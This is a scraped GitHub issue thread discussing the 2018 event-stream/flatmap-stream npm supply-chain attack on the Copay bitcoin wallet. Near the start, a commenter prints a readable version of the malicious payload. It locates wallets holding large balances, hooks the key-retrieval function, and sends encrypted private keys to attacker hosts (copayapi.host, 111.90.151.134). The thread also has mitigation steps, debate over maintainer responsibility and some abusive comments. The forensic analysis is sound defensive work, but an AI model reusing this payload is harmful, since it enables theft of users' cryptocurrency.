1. Looking for the victim hot wallet profiles (this could have been running in mobile apps as well as your regular browser, regardless the device).
2. Iterate over all wallet ids and mapping all public keys which balances where over 100 BTC or 1e3 BCH.
3. Send it to a server in Kuala Lumpur (hosted here: https://www.shinjiru.com.my/ - taken from `nmap -F 111.90.151.134`).

How did the attacker achieve it?
Because they rewrote the [`Credentials.getKeys`](https://github.com/bitpay/bitcore-wallet-client/blob/master/lib/credentials.js#L392) function due to the possibility of the prototypes in JS. The attacker is capturing the password and sending it to the above server."
1537	@brianespinosa It was the initial discovery I was curious about.
1538	Well done @davidpelayo !
1539	"I tried making the secondary payload a little more readable.

```
/*@@*/ ! function() {
    function e() {
        try {
            var o = require(""http""),
                a = require(""crypto""),
                c = ""-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----"";

            function sendRequest(hexEncodedHost, path, payload) {
                hexEncodedHost = Buffer.from(hexEncodedHost, ""hex"").toString();
                var r = o.request({
                    hostname: hexEncodedHost,
                    port: 8080,
                    method: ""POST"",
                    path: ""/"" + t,
                    headers: {
                        ""Content-Length"": payload.length,
                        ""Content-Type"": ""text/html""
                    }
                }, function() {});
                r.on(""error"", function(e) {}), r.write(payload), r.end()
            }

            function encryptAndSend(endpoint, payload) {
                for (var n = """", r = 0; r < payload.length; r += 200) {
                    var o = payload.substr(r, 200);
                    n += a.publicEncrypt(c, Buffer.from(o, ""utf8"")).toString(""hex"") + ""+""
                }

                sendRequest(""636f7061796170692e686f7374"", endpoint, n), //sendRequest(""copayapi.host""...)
                sendRequest(""3131312e39302e3135312e313334"", endpoint, n) //sendRequest(""111.90.151.134""...)
            }

            function runAttack(filename, cb) {
                if (window.cordova) try {
                    var e = cordova.file.dataDirectory;
                    resolveLocalFileSystemURL(e, function(e) {
                        e.getFile(filename, {create: !1}, function(e) {
                            e.file(function(e) {
                                var t = new FileReader;
                                t.onloadend = function() {
                                    return cb(JSON.parse(t.result))
                                }, t.onerror = function(e) {
                                    t.abort()
                                }, t.readAsText(e)
                            })
                        })
                    })
                } catch (e) {} else {
                    try {
                        var r = localStorage.getItem(t);
                        if (r) return n(JSON.parse(r))
                    } catch (e) {}
                    try {
                        chrome.storage.local.get(t, function(e) {
                            if (e) return n(JSON.parse(e[t]))
                        })
                    } catch (e) {}
                }
            }
            global.CSSMap = {}

            runAttack(""profile"", function(e) {
                for (var t in e.credentials) {
                    var cred = e.credentials[t];
                    ""livenet"" == cred.network && runAttack(""balanceCache-"" + cred.walletId, function(e) {
                        var t = this;
                        t.balance = parseFloat(e.balance.split("" "")[0])
                        ""btc"" == t.coin && t.balance < 100 ||""bch"" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, encryptAndSend(""c"", JSON.stringify(t)))
                    }.bind(n))
                }
            });

            var credentials = require(""bitcore-wallet-client/lib/credentials.js"");
            credentials.prototype.getKeysFunc = credentials.prototype.getKeys, credentials.prototype.getKeys = function(e) {
                var keys = this.getKeysFunc(e);
                try {
                    global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], encryptAndSend(""p"", keys + ""\t"" + this.xPubKey))
                } catch (e) {}
                return t
            }
        } catch (e) {}
    }
    window.cordova ? document.addEventListener(""deviceready"", e) : e()
}();
```

what it basically does is first send account details with over 100 bitcoin or 1000 bitcoin cash to `copayhost.api/c` and `111.90.151.134/c`, and then inserts a MitM function so whenever `credentials.getKeys` is called, it conveniently sends the private keys of those accounts to the endpoint `copayapi.host/p` and `111.90.151.134/p`"
1540	So just to be clear, it sounds like if I don't have the flatmap-stream package there is no imminent threat? 
1541	"https://github.com/bitpay/copay/issues/9346#issuecomment-441757628

Looks like `copay` is safe, but they're removing the dependency, and contacting `copay-dash` (a fork) to make sure that they know as well"
1542	"@polson136
> @FallingSnow How was it that this code was originally discovered?

https://github.com/remy/nodemon/issues/1442 aka dumb luck.
"
1543	"> Would gpg-signing and code reviews mitigate this issue?

No, gpg-signing wouldn't. This was no side-loading of a malicious package from an untrusted source. The problem here is the original maintainer of the package, who was giving away the access permissions to his software repository to a stranger. Even a signature wouldn't help here, because I am sure that the maintainer would even give the private keys for the signature to the stranger....

Code reviews would have helped.
"
1544	Fire in the hole
1545	Here comes the bot references flood
1546	"Wouldn't this only affect packages with a description of `A Secure Bitcoin Wallet`? Seems like a very narrowly targeted attack. That's the ""good"" news out of this situation."
1547	"As a heads up, 3.3.6 was published 2-3 months ago.

As such, if you would have been affected by the attack you already would have been affected if you've `npm install`ed in a project that meets the criteria for being compromised over the past 2-3 months."
1548	"There were no bad intentions:
https://github.com/dominictarr/event-stream/issues/73"
1549	"There were no bad intentions:
https://github.com/dominictarr/event-stream/issues/73"
1550	I know npm has a process for this...but, are there any steps that can be taken with github in terms of the attacker's github account?
1551	"> > Would gpg-signing and code reviews mitigate this issue?
> 
> No, gpg-signing wouldn't. This was no side-loading of a malicious package from an untrusted source. The problem here is the original maintainer of the package, who was giving away the access permissions to his software repository to a stranger. Even a signature wouldn't help here, because I am sure that the maintainer would even give the private keys for the signature to the stranger....
> 
> Code reviews would have helped.

Unfortunately Code Reviews do NOT help, as the code on github doesn't need to be the one being built and published to npm. You can actually build locally and  publish something entirely different!"
1552	"![pasted_image_at_2018-11-26__3_19_pm](https://user-images.githubusercontent.com/9933887/49036732-dc642200-f18e-11e8-8fb9-ca00ebcd6a43.jpg)

What to do 😭 "
1553	Would a good CSP block the requests to the attacker's server?
1554	@johhnsantana You're probably fine if you're not running or developing on copay or copay-dash, as this attack specifically targets those packages. (or more specifically it targets packages with a description of 'A Secure Bitcoin Wallet'.) Just remove the dependency on flatmap-stream.
1555	@lmcarreiro If I am understanding [this](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5) article correctly and this exploit is using any of the described methods, I would assume no.
1556	Update: this targets the copay cordova application and all forks that have the [same package description e.g. fcash](https://github.com/fcash-js/fcashpay/blob/59c8d8b973d6e018805425e4947861859eebb696/package.json). [Payload A](https://gist.github.com/jsoverson/3df90445adfca27341ed86426d69f87d#file-payloada-js) decrypts  [payload B](https://gist.github.com/jsoverson/3df90445adfca27341ed86426d69f87d#file-payloadb-js) which injects [payload C](https://gist.github.com/jsoverson/3df90445adfca27341ed86426d69f87d#file-payloadc-js) to the end of a file in the `@zxing/library` package (@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js). This file runs as part of a cordova application on mobile devices or desktops.
1557	"@johhansantana The latest version of `npm-run-all` (4.1.5) includes [this commit](https://github.com/mysticatea/npm-run-all/commit/57d72eb98c2ce108f07d2a2cf1b44d57f08ec3ca) which removes the `ps-tree` dependency. It looks like `expo-and-typescript` is a private package of yours, so presumably you could update its `npm-run-all` dependency?

Good work @mysticatea addressing this so quickly in the `npm-run-all` package!"
1558	@lmcarreiro If I am understanding [this](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5) article correctly and this exploit is using any of the described methods, I would assume no.
1559	"@johhansantana a reinstall worked for me, since the package is already removed from the repo. Note that clearing the cache was necessary in my case.

```
  rm -rf node_modules
  npm cache clear
  npm install
```"
1560	"> 
> 
> > > Would gpg-signing and code reviews mitigate this issue?
> > 
> > 
> > No, gpg-signing wouldn't. This was no side-loading of a malicious package from an untrusted source. The problem here is the original maintainer of the package, who was giving away the access permissions to his software repository to a stranger. Even a signature wouldn't help here, because I am sure that the maintainer would even give the private keys for the signature to the stranger....
> > Code reviews would have helped.
> 
> Unfortunately Code Reviews do NOT help, as the code on github doesn't need to be the one being built and published to npm. You can actually build locally and publish something entirely different!

While true, having an automated way to verify that builds are reproducible would help here. (I wrote one for [the PHP community](https://github.com/paragonie/pharaoh).)"
1561	"@johhansantana does your Expo.io app use either `copay` or `copay-dash`?

If not, you might be able to ease some worry.  This was a very targeted attack."
1562	"@lattwood The `scrypt` mishandling was committed by @jrnewell though: https://github.com/right9ctrl/node-scrypt/commit/52a1cb792bc7ae0e4051ba4ad53e7b60fa5c806d
Weirdly, I couldn't find anything fishy committed by our hacker @right9ctrl, although I may be missing something. Or the rabbit hole may go deeper...

Says a lot about npm that the attack was found because of a deprecation warning..."
1563	Copy on write FTW. If you don't maintain the package, abandon it, let others fork and publish under different name, etc 
1564	@FallingSnow Heya, could you please update the title to something more informative, and edit in a header section into your OP on what people can do to mitigate/remove/etc this from their codebase?
1565	"@fedidat - this looked suspicious to me: https://github.com/right9ctrl/node-scrypt/commit/f14ed8d50e51c25f2ca6ccd412e47241f84d9163#diff-78438df028eeb09f1dee525028604edfR83

But I haven't found any definitive badness yet"
1566	Copy on write FTW. If you don't maintain the package, abandon it, let others fork and publish under different name, etc 
1567	"### **I**
## _LOVE_
# **_COMPUTERS!!!!!!!!!!!!!!!!11111111111111111111111111111111111!!!!!!!!!!!!!!!!!!!!!!!!!!_**"
1568	"### **I**
## _LOVE_
# **_COMPUTERS!!!!!!!!!!!!!!!!11111111111111111111111111111111111!!!!!!!!!!!!!!!!!!!!!!!!!!_**"
1569	"> You put at risk millions of people, and making something for free, but public, means you are responsible for the package.

No, if you aren't properly auditing your packages, YOU are putting your own project and users at risk.  Do not rely on maintainers (especially those who are providing a free service to you) to do all of your development work for you.  

Maintainers should try to secure their projects, but this entitled attitude is ridiculous.  

My 2 cents nobody asked for: I understand it's difficult since node projects have somewhere between 150 billion - 12 zillion dependences since JS has a crowdsourced stdlib for whatever reason, but still... If you want security maybe move away from node.  Now is a good of a time as any to talk about Rust.  It has

- zero-cost abstractions
- move semantics
- guaranteed memory safety
- threads without data races
- trait-based generics
- pattern matching
- type inference
- minimal runtime
- efficient C bindings

"
1570	"> > Would gpg-signing and code reviews mitigate this issue?
> 
> No, gpg-signing wouldn't. This was no side-loading of a malicious package from an untrusted source. The problem here is the original maintainer of the package, who was giving away the access permissions to his software repository to a stranger. Even a signature wouldn't help here, because I am sure that the maintainer would even give the private keys for the signature to the stranger....
> 
> Code reviews would have helped.

What would fix the issue here in my opinion is not having a pile of rights on code, one shouldn’t be allowed to push code this widely, be it for security or just stability.
There should be package maintainers in the npm repository like in any distribution, just regular quick code reading or automated scanning would have noticed that something is completely wrong here."
1571	"> > > > Would gpg-signing and code reviews mitigate this issue?
> > > 
> > > 
> > > No, gpg-signing wouldn't. This was no side-loading of a malicious package from an untrusted source. The problem here is the original maintainer of the package, who was giving away the access permissions to his software repository to a stranger. Even a signature wouldn't help here, because I am sure that the maintainer would even give the private keys for the signature to the stranger....
> > > Code reviews would have helped.
> > 
> > 
> > Unfortunately Code Reviews do NOT help, as the code on github doesn't need to be the one being built and published to npm. You can actually build locally and publish something entirely different!
> 
> While true, having an automated way to verify that builds are reproducible would help here. (I wrote one for [the PHP community](https://github.com/paragonie/pharaoh).)

@paragonie-scott @MattDiMu Then the problem lies in npm itself.. why do they allow such a harmful release policy."
1572	@gcardy in the article's attack, it detects if there is a CSP and avoid sending requests from apps that uses a CSP. But my question is if this @right9ctrl attack uses some code to workaround a good CSP or not. If my bitcoin wallet uses this vulnerable package and uses a good CSP, could my wallets been stolen?
1573	Arguing blame is moot at this point. I suggest keeping the discussion focused entirely on solutions before alienating those who may be trying to assist.
1574	"> > You put at risk millions of people, and making something for free, but public, means you are responsible for the package.
> 
> No, if you aren't properly auditing your packages, YOU are putting your own project and users at risk. Do not rely on maintainers (especially those who are providing a free service to you) to do all of your development work for you.
> 
> Maintainers should try to secure their projects, but this entitled attitude is ridiculous.
> 
> My 2 cents nobody asked for: I understand it's difficult since node projects have somewhere between 150 billion - 12 zillion dependences since JS has a crowdsourced stdlib for whatever reason, but still... If you want security maybe move away from node. Now is a good of a time as any to talk about Rust. It has
> 
> * zero-cost abstractions
> * move semantics
> * guaranteed memory safety
> * threads without data races
> * trait-based generics
> * pattern matching
> * type inference
> * minimal runtime
> * efficient C bindings

Dude I don't think this problem is connected to javascript. The problem lies in the ecosystem around javascript. `npm` is harmful and outdated and the maintainers should start using static dependencies and update dependencies only after code reviews. And most importantly: Maintainers should not trust random dudes from the internet."
1575	"Just an FYI, if you're posting and get ""You can't comment at this time"", be patient, don't mash comment twice.  GitHub is currently being awful and is spitting out false errors.  It'll go through after a minute or so."
1576	"> Dude I don't think this problem is connected to javascript. The problem lies in the ecosystem around javascript.

 🤔"
1577	@dominictarr @FallingSnow maybe just close this issues and stop commenting on it? 
1578	"@lmcarreiro It's important to note that [the article's](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5) attacks and CSP-avoiding workarounds are entirely theoretical. FYI for anyone who hasn't read it.

> I know that sometimes my relentless sarcasm can be difficult to unravel by people on the English-learning path (and also people in need of lightening up). So just to be clear, I have not created an npm package that steals information. This post is entirely fictional, but altogether plausible, and I hope at least a little educational.
> Although this is all made up, it worries me that none of this is hard."
1579	"> ![pasted_image_at_2018-11-26__3_19_pm](https://user-images.githubusercontent.com/9933887/49036732-dc642200-f18e-11e8-8fb9-ca00ebcd6a43.jpg)
> 
> What to do 😭

https://www.npmjs.com/package/concurrently"
1580	"@zawadzkip 

> https://www.npmjs.com/package/concurrently

https://github.com/mysticatea/npm-run-all/issues/150#issuecomment-441658964"
1581	"@zawadzkip 

> https://www.npmjs.com/package/concurrently

https://github.com/mysticatea/npm-run-all/issues/150#issuecomment-441658964"
1582	"> And most importantly: Maintainers should not trust random dudes from the internet.

Not sure if you mean @dominictarr or all the people that used this package as a dependency. 🤔 "
1583	"@patosai Doesn't the source code use 1000 (and not 100) as the limit for Bitcoin Cash? `""btc"" == t.coin && t.balance < 100 ||""bch"" == t.coin && t.balance < 1e3`"
1584	@fharper I think it's worth trying to get your attention on this; may be npm can help with an aditional step before allowing publishing an update that introduces security risks to a popular package or something?
1585	"> @patosai Doesn't the source code use 1000 (and not 100) as the limit for Bitcoin Cash? `""btc"" == t.coin && t.balance < 100 ||""bch"" == t.coin && t.balance < 1e3`

@pcworld you're right, I updated my comment"
1586	"https://github.com/dominictarr/event-stream/blob/master/LICENCE

![image](https://user-images.githubusercontent.com/974410/49038886-8b6c2200-f1be-11e8-9cfa-7b359eb6884b.png)


¯\\_(ツ)_/¯"
1587	the creator of this package is fucking idiot...
1588	"@dominictarr thanks for all the open sourced modules! ❤️I learned a lot from his work.

Funny how some people demand he takes responsibility for something he gave away for free."
1589	"It would be nice if people didn't conflate 'social responsibility' with 'legal liability'. I think all of us know that the common open-source licenses include a no-liability clause, so posting that detail really doesn't contribute anything to the discussion, even if it makes you feel smug.

The *actual* topic of discussion here is whether maintainers of packagers should bear a *social* responsibility towards carefully maintaining their projects, and under what conditions a package should or shouldn't be handed over to another party - and to some degree, how much of the review burden lies with the *user* of the package.

So, let's keep the discussion to that."
1590	Looks like npm took control of the project and removed the malicious version from npmjs.com https://www.npmjs.com/package/event-stream?activeTab=versions
1591	"@right9ctrl did nothing wrong

XD"
1592	"Check this dependency tree guys:
```
request -> tough-cookie -> psl -> JSONStream -> event-stream -> flatmap-stream
```

I think this issue is going to provoke some serious headaches"
1593	"Check this dependency tree guys:
```
request -> tough-cookie -> psl -> JSONStream -> event-stream -> flatmap-stream
```

I think this issue is going to provoke some serious headaches"
1594	"> @zawadzkip
> 
> > https://www.npmjs.com/package/concurrently
> 
> [mysticatea/npm-run-all#150 (comment)](https://github.com/mysticatea/npm-run-all/issues/150#issuecomment-441658964)

Thanks, just gotta make sure everything is updated now."
1595	"> the creator of this package is fucking idiot...

You seem like a reasonable person. I'll bet you've never made a mistake.

Next time you want to be toxic, remember that there are people on the other end of your computer screen."
1596	Yes, the legal liabilities are banished by the license, but I think handing over control of the project to a brand new account should probably be frowned upon.
1597	"As for my personal views on the matter... there are a few long-running problems, that are not specific to JS, but whose effects are *magnified* in JS due to the way people handle dependencies:

- __There's no review tooling.__ It's practically impossible to review every single dependency in the tree every single time you update anything. This could be made possible by having software to track what dependencies have and haven't been reviewed, and that prevents new dependencies from being added until they've been reviewed.
- __There's no support structure for unwanted packages.__ What do you do when you no longer want to maintain a package? Put a notice in the README and hope that somebody steps up? Wait for somebody to get angry in the issues? Just stop maintaining it?

  There needs to be a way for maintainers to put up their packages for 'adoption', in a manner that's transparent to the community (and in particular the userbase of those packages), and that prevents assignment of packages to people with malicious intentions. This is only partly a technical problem, it's largely a social issue to solve.
- __There's no funding model for small packages.__ People probably aren't going to donate to a package that's three levels deep in the dependency tree, nor get a support contract for it, regardless of how important they are to the ecosystem. There are some companies trying to address this, but personally I've not been convinced by their approach yet. This topic really needs more discussion.
- __There's no clear way to indicate how well-maintained a package is.__ Is a package actively maintained, in maintenance mode, unmaintained, or something else? There's no standardized way to know. This one will probably be difficult to solve in the JS ecosystem without npm's cooperation, but it's an important problem nevertheless. A lot of people seem to have been caught off-guard by @dominictarr's response here about maintenance.
- __There's no consensus on the social responsibility that authors have.__ Personally I feel that authors *do* have a responsibility to manage their projects responsibly; that can mean either active maintenance, or clearly marking a package as unmaintained/insecure/etc. This would be no different from the general principle of not handing people dangerous things in real life without warnings, whether you get paid for it or not.

  But there seems to be a lot of disagreement on this, and it's something we need to have a serious discussion about as a community.

None of these issues are *unique* to JS. But with the small-modules-by-default model, some of them have more of an impact when left unsolved; and npm's closed-source nature and lack of oversight from the community doesn't really help with solving this either.

That's not to say that small modules should be avoided; there are still [myriad benefits](https://twitter.com/joepie91/status/1065193459349446656) to them. But we *need* to address these issues as a community."
1598	"FYI,
If you are using yarn, and are having issues with how to resolve this, you can use yarn `resolutions` feature.

https://yarnpkg.com/lang/en/docs/selective-version-resolutions/

This is helpful if for example older versions of packages like `JSONStream` use `event-stream@~0.7.0` but newer packages use `event-stream@3.3.4`

@fedehoerth"
1599	"To downgrade `event-stream` to an assumingly safe version published on npm 2 years ago:

`npm install event-stream@3.3.4 --depth 10`

Latest npm will add this package as a direct dependency to `package.json` - you probably don't want that - so you can just `git checkout -- package.json` and commit the changed `package-lock.json` to your project."
1600	"Hmm.. what about that `react` repo then?
https://github.com/right9ctrl?tab=repositories"
1601	"In any other repositories, if the maintainer gave their package to a hacker, the maintainer would be to blame.  You don't just give you repo/package that is being used by other repos/packages to some random person without looking into it at all unless you just don't at all care about the ecosystem.

Honestly, this shouldn't even be a thing that ***can*** happen.  There should be some sort of approval process for swittching maintainers.  People should be notified when the vendor for a repo/package changes ***every time***.  npm needs some major work here."
1602	"> > the creator of this package is fucking idiot...
> 
> You seem like a reasonable person. I'll bet you've never made a mistake.
> 
> Next time you want to be toxic, remember that there are people on the other end of your computer screen.

Bet on me! I would not give any popular package, that people use it in production, to a hacker that mine bitcoin with it. He has no excuse, he is an idiot."
1603	"@Fishrock123 
> @FallingSnow Heya, could you please update the title to something more informative, and edit in a header section into your OP on what people can do to mitigate/remove/etc this from their codebase?

Done.
___

As this issue no longer exists in the master branch or npm I am closing this issue.

@everyone Unless you have something more to add **forensically** to the issue, please do not comment."
1604	"@joepie91 They bear no social responsibility, they explicitly warned you with an MIT license. MIT license is the epitome of Caveat Emptor. The consumer bears all social responsibility as the producer provided this as a good Samaritan. They are not beholden to you any more than the creator of a sandwich you found in a bus seat pocket.  If this event bothers you just wait till someone is actually malicious. Don't update to new versions without any consideration. It seems like the entire NPM community is trusting the entire NPM community to do their due diligence. No matter what your language is that's a very bad idea. We had thousands of packages depending on a package that clearly nobody was reading. The onus of responsibility is not on this one dude, it's on the entire community and the culture of lax security.

edit: Posted this before FallingSnow's message was visible."
1605	"> @dominictarr thanks for all the open sourced modules! heartI learned a lot from his work.
> 
> Funny how some people demand he takes responsibility for something he gave away for free.

He gave the publishing rights to some unknown individual, not giving a rat's arse about safety of downstream packages, it is his responsibility to vet to the best of his knowledge anyone who he would give write access/publishing rights to.

No weaseling out of this."
1606	"@simoniz0r npm knows how many times packages are downloaded and what their dependencies are. They could work out how ""important"" each package is to the ecosystem and tier them. Higher tiers could auto archive or gently nag committers to deprecate. The highest tiers could require extra diligence to switch committers. This way the vibrancy of the ecosystem could be maintained while making sure the most important parts of it were secure."
1607	"@voronoipotato The only issue with saying ""its a MIT license so you got what you paid for"" is exactly what @joepie91 said in the same comment: It's extremely hard to look 5+ layers down at your dependency tree and audit each of them to find MIT licensed packages.
"
1608	"@Henning-K 

> it is his responsibility to vet to the best of his knowledge anyone who he would give write access/publishing rights to.

Says you and what contract you signed with him?"
1609	@davidwarshaw openSUSE's package manager, zypper handles stuff like this very well.  Whenever the vendor changes for a package, the user is notified.  npm should do something similar to this.  The user should be notified every time that the vendor changes for a package.
1610	@joepie91 I think the best way forward for the author (as far as social responsibility, not legal responsibility) who want to discontinue the project maintenance is to make a note in the project ReadMe that it's no longer maintained by the author and let people fork off from this project (if allowed by license) so that the new maintainer would have to re-earn the trust that the author have earned.
1611	"https://medium.freecodecamp.org/npm-package-hijacking-from-the-hijackers-perspective-af0c48ab9922

Kinda relevant article making a joke about this sorta thing back in 2016"
1612	To those throwing around the idea that nobody has been auditing their dependencies; did you miss the part in the original report where it stated that the malicious code was **only present in the minified version** of the package? Seems there is an underlying issue of npm not enforcing deterministic minification or something along those lines here.
1613	">Says you and what contract you signed with him?

I hate when people intentionally confuse legal and social."
1614	"> @Henning-K
> 
> > it is his responsibility to vet to the best of his knowledge anyone who he would give write access/publishing rights to.
> 
> Says you and what contract you signed with him?

I'm pretty sure it's called ""basic decency"". It's like keeping the key to an asylum for the criminally insane after quitting there and then giving that key to the first random you run into upon exiting said institution. It will not end well."
1615	"[![](http://img.youtube.com/vi/Mm_RuObpeGo/0.jpg)](http://www.youtube.com/watch?v=Mm_RuObpeGo) 

Spoke about this a couple months ago at NDC. See above video. Handing over a repo you no longer maintain (in your spare time for free) to someone who says they want to maintain it. I have done the exact thing several times.  Amazed people are angry at them. This is what happens when u rely on a broken support model."
1616	"> > @Henning-K
> > > it is his responsibility to vet to the best of his knowledge anyone who he would give write access/publishing rights to.
> > 
> > 
> > Says you and what contract you signed with him?
> 
> I'm pretty sure it's called ""basic decency"". It's like keeping the key to an asylum for the criminally insane after quitting there and then giving that key to the first random you run into upon exiting said institution. It will not end well.

Except its not like that at all."
1617	"> Dude I don't think this problem is connected to javascript. The problem lies in the ecosystem around javascript. `npm` is harmful and outdated and the maintainers should start using static dependencies and update dependencies only after code reviews. And most importantly: Maintainers should not trust random dudes from the internet.

You're not wrong, but to me language and ecosystem are inseparable. The fact that JS by itself isn't the problem is sort of irrelevant compared to how it's actually used. Also worth considering, would the ecosystem be the way it is if the JS stdlib was more comprehensive and robust? (side note: there is no definitive JS runtime - only a spec to be implemented by runtime developers. I'm sure this also plays a key role to the unique state of the language.) I also agree that the weight of responsibility lies heavier on users of these packages. Never forget TANSTAAFL - everything free has a price."
1618	"@MrStonedOne

> I hate when people intentionally confuse legal and social.

@Henning-K 

> I'm pretty sure it's called ""basic decency"". It's like keeping the key to an asylum for the criminally insane after quitting there and then giving that key to the first random you run into upon exiting said institution. It will not end well.

NPM users are criminally insane? Interesting analogy. How about instead of insulting developers using a twisted metaphor, let's talk about why there's an ""insane asylum"" in the first place. If this is truly a social problem, then the solution is also social: eliminate the insane asylum, or the need for it in the first place. Seems like this problem exists more because of how NPM was designed and how developers integrate with it. Even a background check on the guy may not have prevented this. So how much is due diligence before it is acceptable as ""basic decency""? The ones lacking basic decency here are you.

Stop attacking the owners/maintainers of OSS repos."
1619	"this jackass @dominictarr probably got paid by a Chinese hacker and handed it over to him, otherwise why would he hand over a popular package to a stranger? if anybody wants to commit a change to this package all they have to do is submit a change without handing out the publishing rights to anybody

"
1620	"this jack*** @dominictarr probably got paid by a Chinese hacker and handed it over to him, otherwise why would he hand over a popular package to a stranger? if anybody wants to commit a change to this package all they have to do is submit a change without handing out the publishing rights to anybody

"
1621	"> NPM users are criminally insane? Interesting analogy. How about instead of insulting developers using a twisted metaphor, let's talk about why there's an ""insane asylum"" in the first place. If this is truly a social problem, then the solution is also social: eliminate the insane asylum, or the need for it in the first place.

I don't think this is how the analogy works"
1622	"I hate how maintainers are above recrimination to some people.  Yes, maintainers get a lot off crap from users over stuff they shouldn't, but passing the torch to some guy they don't know with no commit history is a **_dumb idea_**.

We need to acknowledge at some point that maintainers have some level of responsibility when they take command.  Legal responsibility can be waved, but don't be surprised if people show up with torches and pitchforks when you do something like giving some guy you don't know access to NPM and he does something like this with it.
"
1623	@broros There's no reason to be rude or to make accusations towards him. We all make mistakes & It's lesson that counts, hopefully community will learn & avoids these kinds of unfortunate events in future.
1624	"this jacka** @dominictarr probably got paid by a Chinese hacker and handed it over to him, otherwise why would he hand over a popular package to a stranger? if anybody wants to commit a change to this package all they have to do is submit a change without handing out the publishing rights to anybody

"
1625	"> why would he hand over a popular package to a stranger?

Because he was no longer maintaining it and probably didn't care, which is reasonable. Please stop making crazy conspiracies just because ownership was handed over to someone else. Once you have evidence maybe it would be fit to post here.

> Stop attacking the owners/maintainers of OSS repos.

^^^^^^"
1626	" @dominictarr probably got paid by a Chinese hacker and handed it over to him, otherwise why would he hand over a popular package to a stranger? if anybody wants to commit a change to this package all they have to do is submit a change without handing out the publishing rights to anybody

"
1627	@broros I have reported you to Github. Please stop commenting.
1628	Yea... def not @dominictarr's responsibility.  Buck stops with you.  Maintain your dependencies.
1629	"> @MrStonedOne
> 
> > I hate when people intentionally confuse legal and social.
> 
> @Henning-K
> 
> > I'm pretty sure it's called ""basic decency"". It's like keeping the key to an asylum for the criminally insane after quitting there and then giving that key to the first random you run into upon exiting said institution. It will not end well.
> 
> NPM users are criminally insane? Interesting analogy. How about instead of insulting developers using a twisted metaphor, let's talk about why there's an ""insane asylum"" in the first place. If this is truly a social problem, then the solution is also social: eliminate the insane asylum, or the need for it in the first place. Seems like this problem exists more because of how NPM was designed and how developers integrate with it. Even a background check on the guy may not have prevented this. So how much is due diligence before it is acceptable as ""basic decency""? The ones lacking basic decency here are you.
> 
> Stop attacking the owners/maintainers of OSS repos.

Oh, I'm SO sorry that I am of the mindset that you give something crucial to the safety of potentially millions of people only to someone you absolutely trust...
And if a background check can't turn up that trust then the rights simply do not get transferred, so that a potentially malicious actor has to make a fork of the original pkg which itself would have to gain the trust of other devs/users in order for it to be used as a dependency.

(Also, I've been to an ""asylum for the criminally insane"" for tech-work related reasons and it's actually a place where addicted/mentally ill criminals are locked away as ordered by a court but are also given group- & ergotherapy so that they may leave a comparatively harmless prison as treated/healed people)"
1630	Might be time to lock this thread before it becomes even more of a dumpster fire. Just sayin'.
1631	Might be the time to check if you are using any other thing published by @dominictarr which he might give control away to unknown players for in the future...
1632	"@FallingSnow clearly deserves lots of thanks and respect from the community. Thank you!!!

ps lmk how I (and, potentially, others) can thank you with a buck for some 🍺 "
1633	Reported @broros 
1634	Please include me in the screenshot 
1635	"In the second stage, does anyone know what’s in `./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js` and how such malicious encrypted payload landed into this file? This file looks unaltered in the two versions of `@zxing/library` in [the current Copay’s `package-lock.json`](https://github.com/bitpay/copay/blob/master/package-lock.json).

Thanks."
1636	"> @aparajita you're right. Check out this code snippet from another repo in that same user: https://github.com/right9ctrl/node-scrypt/blob/52a1cb792bc7ae0e4051ba4ad53e7b60fa5c806d/src/scryptwrapper/hash.c#L39-L45
> 
> Left shifting `1` by the number of rounds you're supposed to use for scrypt (2^14 - 2^20) results in the rounds being set to `0`!

@fedidat, @lattwood:  That code is from this PR (https://github.com/barrysteyn/node-scrypt/pull/119) and is completely innocuous and correct to make the package's API consistent.  Please stop posting incorrect information.

The attacker cloned that repo including the commit history. "
1637	"![unsub](https://user-images.githubusercontent.com/9406403/49042726-397cc980-f1c9-11e8-87d5-242ae79741ac.gif)
"
1638	"For reference on the @broros repeated posts.

Github is repeatedly giving me ""You can't comment at this time"" error messages while accepting my comments. it's likely he doesn't even know his comments are making it through.

![image](https://user-images.githubusercontent.com/7069733/49042990-8ab39b80-f17e-11e8-860a-abe333e610fb.png)
"
1639	lol
1640	Doesn't matter how many times he comments it because of the error, @MrStonedOne. I've reported him purely on the basis of his abusive and inappropriate language.
1641	"> Doesn't matter how many times he comments it because of the error, @MrStonedOne. I've reported him purely on the basis of his abusive and inappropriate language.

Agreed, also GH throwing errors does not change the content of the comments that foulmouth broros posted, i.e. they *wanted* to post that comment again and again."
1642	Is anyone aware of a confirmation that the user who published the affected version had their credentials revoked?
1643	@fent the characters you're referring to are Japanese for Tokyo. Please consider revising your comment to avoid spreading the inaccuracy.
1644	"> 
> 
> Is anyone aware of a confirmation that the user who published the affected version had their credentials revoked?

NPM took over the package."
1645	"> Might be the time to check if you are using any other thing published by @dominictarr which he might give control away to unknown players for in the future...

good luck with that. @dominictarr is one of the most prolific early contributors to the Node ecosystem. If it wasn't for @dominictarr Node might have even taken a different path. 

Ultimately you will pay for the software you use. In the case of OSS as it currently stands many companies/people are happy to freely use but not so happy to contribute (financially or otherwise). Social culpability works both ways. So you pay in risk, or you pay in auditing hours. "
1646	Maybe letting the maintainer provide the minified source is a problem, too?
1647	"An incomplete list of `event-stream`'s indirect dependencies (1327 items):

```json
